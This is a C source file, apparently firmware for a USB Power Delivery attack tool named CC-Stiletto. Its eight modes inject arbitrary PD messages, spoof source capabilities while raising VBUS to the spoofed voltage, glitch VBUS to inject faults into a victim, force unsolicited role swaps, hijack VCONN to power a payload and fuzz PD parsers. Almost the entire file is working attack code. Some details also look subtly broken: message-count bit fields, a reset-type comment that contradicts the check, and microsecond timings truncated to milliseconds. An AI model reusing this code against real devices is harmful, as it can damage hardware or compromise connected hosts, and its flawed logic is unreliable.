/*
 * policy_engine.c — CC-Stiletto attack policy dispatcher.
 *
 * Hosts the seven attack modes described in the README. Each mode is a set of
 * callbacks invoked by the main loop. The dispatcher owns the shared context
 * (telemetry, queues, configuration) and the policy table.
 *
 * Author: jayis1
 * Copyright (c) 2026 jayis1. All rights reserved.
 */

#include "policy_engine.h"
#include "power_path.h"
#include "console.h"
#include "board.h"
#include <string.h>

const policy_info_t policy_table[POL_COUNT] = {
    [POL_SNIFF]          = { POL_SNIFF,          "sniff",        "Transparent PD relay + log" },
    [POL_INJECT]         = { POL_INJECT,         "inject",       "Queue and inject arbitrary PD" },
    [POL_SPOOF_VOLTAGE]  = { POL_SPOOF_VOLTAGE,  "spoof",        "Present fake Source_Capabilities" },
    [POL_GLITCH]        = { POL_GLITCH,        "glitch",       "Timed VBUS fault injection" },
    [POL_ROLE_HIJACK]    = { POL_ROLE_HIJACK,    "role-hijack",  "Unsolicited DR/PR/FR swaps" },
    [POL_VCONN_HIJACK]  = { POL_VCONN_HIJACK,  "vconn-hijack", "Steal VCONN to power payload" },
    [POL_DEAD_BATTERY]   = { POL_DEAD_BATTERY,   "dead-battery", "Emulate dead-battery sink" },
    [POL_FUZZ]          = { POL_FUZZ,          "fuzz",         "Random malformed PD fuzzing" },
};

/* ---- Forward decls of per-policy handlers -------------------------------- */
static void pol_sniff_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_sniff_tick(policy_ctx_t *c, uint32_t now);
static void pol_inject_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_inject_tick(policy_ctx_t *c, uint32_t now);
static void pol_spoof_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_spoof_tick(policy_ctx_t *c, uint32_t now);
static void pol_glitch_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_glitch_tick(policy_ctx_t *c, uint32_t now);
static void pol_hijack_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_hijack_tick(policy_ctx_t *c, uint32_t now);
static void pol_vconn_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_vconn_tick(policy_ctx_t *c, uint32_t now);
static void pol_dead_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_dead_tick(policy_ctx_t *c, uint32_t now);
static void pol_fuzz_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m);
static void pol_fuzz_tick(policy_ctx_t *c, uint32_t now);

typedef void (*ev_fn)(policy_ctx_t *, pd_phy_t *, pd_msg_t *);
typedef void (*tk_fn)(policy_ctx_t *, uint32_t);

static const ev_fn event_fns[POL_COUNT] = {
    pol_sniff_event, pol_inject_event, pol_spoof_event, pol_glitch_event,
    pol_hijack_event, pol_vconn_event, pol_dead_event, pol_fuzz_event,
};
static const tk_fn tick_fns[POL_COUNT] = {
    pol_sniff_tick, pol_inject_tick, pol_spoof_tick, pol_glitch_tick,
    pol_hijack_tick, pol_vconn_tick, pol_dead_tick, pol_fuzz_tick,
};

/* ---- Helpers ------------------------------------------------------------- */

/* Relay a received message to the *other* side, optionally mutating it.
 * Used by SNIFF and INJECT modes to keep the link alive. */
static void relay_msg(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    pd_phy_t *to = (from == c->src) ? c->snk : c->src;
    /* Re-emit with our own message-id on the destination side */
    bool is_ctrl = ((m->header >> 14) & 0x07u) == 0;
    uint8_t nobj = (uint8_t)((m->header >> 14) & 0x07u);
    /* Send through stack so the id tracker increments on the outbound side */
    uint8_t type = (uint8_t)(m->header & 0x0Fu);
    pd_stack_send(c->ids, to, SOP_SOP, type, m->obj, nobj, is_ctrl);
}

static void log_event(const char *tag, pd_msg_t *m)
{
    char buf[96];
    pd_sniff_format(m, buf, sizeof(buf));
    console_emit("evt pd %s %s", tag, buf);
}

/* ---- SNIFF --------------------------------------------------------------- */
static void pol_sniff_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    const char *tag = (from == c->src) ? "src->snk" : "snk->src";
    log_event(tag, m);
    relay_msg(c, from, m);
}
static void pol_sniff_tick(policy_ctx_t *c, uint32_t now) { (void)c; (void)now; }

/* ---- INJECT -------------------------------------------------------------- */
static void pol_inject_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    /* In inject mode we still relay so the link stays up, but the operator can
     * queue custom messages that fire on the next tick. */
    relay_msg(c, from, m);
}
static void pol_inject_tick(policy_ctx_t *c, uint32_t now)
{
    (void)now;
    if (c->inject_head == c->inject_tail) return;
    uint8_t idx = c->inject_head;
    const uint8_t *b = c->inject_queue[idx];
    uint8_t len = c->inject_len[idx];
    /* b[0]=sop, b[1..2]=hdr LE, b[3..]=objs */
    uint8_t sop = b[0];
    uint16_t hdr = (uint16_t)b[1] | ((uint16_t)b[2] << 8);
    uint8_t nobj = (uint8_t)((len - 3) / 4);
    uint32_t obj[7];
    for (uint8_t i = 0; i < nobj && i < 7; i++) {
        obj[i] = (uint32_t)b[3 + 4*i] | ((uint32_t)b[4 + 4*i] << 8)
               | ((uint32_t)b[5 + 4*i] << 16) | ((uint32_t)b[6 + 4*i] << 24);
    }
    /* Send on both PHYs so the injection lands regardless of orientation */
    pd_phy_send(c->src, sop, hdr, obj, nobj);
    pd_phy_send(c->snk, sop, hdr, obj, nobj);
    console_emit("evt inject sent type=%u nobj=%u", hdr & 0x0Fu, nobj);
    c->inject_head = (uint8_t)((idx + 1u) & 0x0Fu);
}

/* ---- SPOOF_VOLTAGE ------------------------------------------------------- */
static void pol_spoof_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    /* When the sink asks for capabilities, reply with our fake PDO set. */
    bool is_ctrl = ((m->header >> 14) & 0x07u) == 0;
    uint8_t type = (uint8_t)(m->header & 0x0Fu);
    if (is_ctrl && type == PD_MSG_GET_SOURCE_CAP && from == c->snk) {
        uint32_t pdo = pdo_fixed(c->spoof_mv, c->spoof_ma, 0);
        pd_stack_send(c->ids, c->snk, SOP_SOP, PD_MSG_SOURCE_CAP, &pdo, 1, false);
        console_emit("evt spoof sent %umV/%umA", c->spoof_mv, c->spoof_ma);
        return;
    }
    /* Accept any Request that matches our spoofed PDO */
    if (!is_ctrl && type == PD_MSG_REQUEST && from == c->snk) {
        pd_stack_send_control(c->ids, c->snk, SOP_SOP, PD_MSG_ACCEPT);
        /* Actually set the VBUS rail to the spoofed voltage via DAC + eFuse */
        power_path_set_vbus(c->spoof_mv);
        power_path_set_ilimit(3000);   /* 3 A ceiling by default */
        power_path_source_enable(true);
        pd_stack_send_control(c->ids, c->snk, SOP_SOP, PD_MSG_PS_RDY);
        console_emit("evt spoof accepted + VBUS=%umV", c->spoof_mv);
        return;
    }
    relay_msg(c, from, m);
}
static void pol_spoof_tick(policy_ctx_t *c, uint32_t now) { (void)c; (void)now; }

/* ---- GLITCH -------------------------------------------------------------- */
/* The glitch primitive works by first negotiating the victim to a high voltage
 * (glitch_high_mv) then, after glitch_high_us, abruptly dropping VBUS to
 * glitch_low_mv for glitch_low_us before restoring. The HRTIM drives the MOSFET
 * bank with sub-microsecond precision. Repeat up to glitch_repeat times. */
static void pol_glitch_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    relay_msg(c, from, m);   /* keep link up while we prepare the glitch */
}
static void pol_glitch_tick(policy_ctx_t *c, uint32_t now)
{
    if (!c->glitch_armed) return;
    static uint8_t rep;
    static uint32_t t_phase;
    static enum { G_IDLE, G_HIGH, G_LOW, G_RESTORE } phase = G_IDLE;
    if (phase == G_IDLE) {
        /* Drive victim to high voltage first */
        power_path_set_vbus(c->glitch_high_mv);
        power_path_source_enable(true);
        t_phase = now;
        phase = G_HIGH;
        console_emit("evt glitch high=%umV", c->glitch_high_mv);
    } else if (phase == G_HIGH && (now - t_phase) >= c->glitch_high_us / 1000u) {
        /* Drop to low voltage */
        power_path_set_vbus(c->glitch_low_mv);
        t_phase = now;
        phase = G_LOW;
        console_emit("evt glitch low=%umV", c->glitch_low_mv);
    } else if (phase == G_LOW && (now - t_phase) >= c->glitch_low_us / 1000u) {
        /* Restore high voltage for next cycle */
        power_path_set_vbus(c->glitch_high_mv);
        t_phase = now;
        phase = G_RESTORE;
        console_emit("evt glitch restore");
    } else if (phase == G_RESTORE && (now - t_phase) >= 5u) {
        rep++;
        if (rep >= c->glitch_repeat) {
            c->glitch_armed = false;
            phase = G_IDLE;
            rep = 0;
            power_path_source_enable(false);
            console_emit("evt glitch done");
        } else {
            phase = G_HIGH;
            t_phase = now;
        }
    }
}

/* ---- ROLE_HIJACK --------------------------------------------------------- */
static void pol_hijack_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    /* If a Hard Reset arrives, re-issue our hijack sequence. */
    bool is_ctrl = ((m->header >> 14) & 0x07u) == 0;
    uint8_t type = (uint8_t)(m->header & 0x0Fu);
    if (is_ctrl && type == PD_MSG_SOFT_RESET) {
        pol_hijack_tick(c, 0);
    }
    relay_msg(c, from, m);
}
static void pol_hijack_tick(policy_ctx_t *c, uint32_t now)
{
    static uint32_t last;
    if (now - last < c->hijack_interval_ms) return;
    last = now;
    if (c->hijack_do_dr) {
        pd_stack_send_control(c->ids, c->snk, SOP_SOP, PD_MSG_DR_SWAP);
        console_emit("evt hijack DR_Swap -> snk");
    }
    if (c->hijack_do_pr) {
        pd_stack_send_control(c->ids, c->src, SOP_SOP, PD_MSG_PR_SWAP);
        console_emit("evt hijack PR_Swap -> src");
    }
    if (c->hijack_do_frs) {
        /* FRS is triggered by toggling the FRS signal line on the PHY */
        fusb_write(c->snk, FUSB_CONTROL0, 0x80u);   /* FRS signal bit */
        console_emit("evt hijack FRS -> snk");
    }
}

/* ---- VCONN_HIJACK -------------------------------------------------------- */
static void pol_vconn_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    /* Take VCONN on the source side; the host thinks it is powering an
     * e-marker/cable but actually feeds our payload. */
    pd_phy_enable_vconn(c->src, true);
    console_emit("evt vconn hijacked");
    relay_msg(c, from, m);
}
static void pol_vconn_tick(policy_ctx_t *c, uint32_t now) { (void)c; (void)now; }

/* ---- DEAD_BATTERY -------------------------------------------------------- */
static void pol_dead_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    (void)m;
    /* Present as a dead-battery sink: pull CC down with Rd, wait for 5 V,
     * then immediately issue a Request for the lowest PDO. */
    pd_phy_set_role(c->snk, PD_POWER_SINK, PD_ROLE_SINK);
    /* The FUSB302B auto-asserts Rd on the unconnected CC when SWITCHES0 is
     * programmed for sink mode. */
    power_path_sink_enable(true);
    console_emit("evt dead-battery sink asserted");
}
static void pol_dead_tick(policy_ctx_t *c, uint32_t now)
{
    (void)c; (void)now;
    static bool requested;
    if (!requested && c->vbus_src_mv > 4500) {
        /* VBUS is up — request minimum current. */
        uint32_t rdo = rdo_fixed(0, 500, false, false);
        pd_stack_send(c->ids, c->snk, SOP_SOP, PD_MSG_REQUEST, &rdo, 1, false);
        requested = true;
    }
}

/* ---- FUZZ ---------------------------------------------------------------- */
static uint16_t lfsr = 0xBEEFu;
static uint16_t rnd16(void)
{
    /* Galois LFSR for deterministic fuzz seeds */
    uint16_t bit = (lfsr & 1u) ^ ((lfsr >> 1) & 1u) ^ ((lfsr >> 3) & 1u)
                 ^ ((lfsr >> 12) & 1u);
    lfsr = (lfsr >> 1) | (bit << 15);
    return lfsr;
}
static void pol_fuzz_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    (void)from;
    /* On every received message, respond with a random malformed packet. */
    uint16_t hdr = rnd16();
    uint32_t obj[7];
    uint8_t nobj = (uint8_t)(rnd16() & 0x07u);
    for (uint8_t i = 0; i < nobj; i++) obj[i] = ((uint32_t)rnd16() << 16) | rnd16();
    pd_stack_send(c->ids, c->snk, SOP_SOP, (uint8_t)(hdr & 0x0Fu), obj, nobj,
                  ((hdr >> 14) & 7u) == 0);
    c->fuzz_count++;
}
static void pol_fuzz_tick(policy_ctx_t *c, uint32_t now)
{
    (void)now;
    /* Periodically emit a random SOP' packet to fuzz the cable-plug parser. */
    if ((rnd16() & 0x07u) == 0) {
        uint16_t hdr = rnd16();
        uint32_t o = (uint32_t)rnd16() << 16 | rnd16();
        pd_phy_send(c->snk, SOP_SOPP, hdr, &o, 1);
        c->fuzz_count++;
    }
}

/* ---- Public API ---------------------------------------------------------- */

void policy_init(policy_ctx_t *c, pd_phy_t *src, pd_phy_t *snk, pd_id_t *ids)
{
    memset(c, 0, sizeof(*c));
    c->src = src;
    c->snk = snk;
    c->ids = ids;
    c->active = POL_SNIFF;
    c->spoof_mv = 20000;
    c->spoof_ma = 3000;
    c->glitch_high_mv = 20000;
    c->glitch_low_mv  = 5000;
    c->glitch_high_us = 1500;
    c->glitch_low_us  = 300;
    c->glitch_repeat  = 3;
    c->hijack_interval_ms = 2000;
}

int policy_set(policy_ctx_t *c, policy_id_t id)
{
    if (id >= POL_COUNT) return -1;
    c->active = id;
    /* Re-apply role defaults when entering a mode */
    switch (id) {
    case POL_SPOOF_VOLTAGE:
        pd_phy_set_role(c->snk, PD_POWER_SOURCE, PD_ROLE_SOURCE);
        break;
    case POL_DEAD_BATTERY:
        pd_phy_set_role(c->snk, PD_POWER_SINK, PD_ROLE_SINK);
        break;
    case POL_VCONN_HIJACK:
        pd_phy_enable_vconn(c->src, true);
        break;
    default:
        break;
    }
    console_emit("evt mode %s", policy_table[id].name);
    return 0;
}

void policy_dispatch_event(policy_ctx_t *c, pd_phy_t *from, pd_msg_t *m)
{
    event_fns[c->active](c, from, m);
}

void policy_dispatch_tick(policy_ctx_t *c, uint32_t now_ms)
{
    tick_fns[c->active](c, now_ms);
}

int policy_queue_inject(policy_ctx_t *c, uint8_t sop, uint16_t hdr,
                         const uint32_t *obj, uint8_t nobj)
{
    uint8_t nxt = (uint8_t)((c->inject_tail + 1u) & 0x0Fu);
    if (nxt == c->inject_head) return -1;     /* queue full */
    uint8_t *b = c->inject_queue[c->inject_tail];
    b[0] = sop;
    b[1] = (uint8_t)(hdr & 0xFFu);
    b[2] = (uint8_t)(hdr >> 8);
    for (uint8_t i = 0; i < nobj && i < 7; i++) {
        b[3 + 4*i]     = (uint8_t)(obj[i] & 0xFFu);
        b[4 + 4*i]     = (uint8_t)(obj[i] >> 8 & 0xFFu);
        b[5 + 4*i]     = (uint8_t)(obj[i] >> 16 & 0xFFu);
        b[6 + 4*i]     = (uint8_t)(obj[i] >> 24 & 0xFFu);
    }
    c->inject_len[c->inject_tail] = (uint8_t)(3 + 4 * nobj);
    c->inject_tail = nxt;
    return 0;
}

int policy_configure_glitch(policy_ctx_t *c, uint16_t hi_mv, uint16_t lo_mv,
                             uint32_t hi_us, uint32_t lo_us, uint8_t repeat)
{
    if (hi_mv > VBUS_SAFE_MAX_MV || lo_mv > VBUS_SAFE_MAX_MV) return -1;
    c->glitch_high_mv = hi_mv;
    c->glitch_low_mv  = lo_mv;
    c->glitch_high_us = hi_us;
    c->glitch_low_us  = lo_us;
    c->glitch_repeat  = repeat;
    return 0;
}

int policy_configure_spoof(policy_ctx_t *c, uint16_t mv, uint16_t ma)
{
    if (mv > VBUS_ABS_MAX_MV) return -1;
    c->spoof_mv = mv;
    c->spoof_ma = ma;
    return 0;
}

int policy_configure_hijack(policy_ctx_t *c, bool dr, bool pr, bool frs,
                             uint16_t interval_ms)
{
    c->hijack_do_dr = dr;
    c->hijack_do_pr = pr;
    c->hijack_do_frs = frs;
    c->hijack_interval_ms = interval_ms;
    return 0;
}

int policy_arm(policy_ctx_t *c)
{
    if (c->active == POL_GLITCH) {
        c->glitch_armed = true;
        console_emit("evt armed glitch");
    }
    return 0;
}

int policy_disarm(policy_ctx_t *c)
{
    c->glitch_armed = false;
    power_path_source_enable(false);
    console_emit("evt disarmed");
    return 0;
}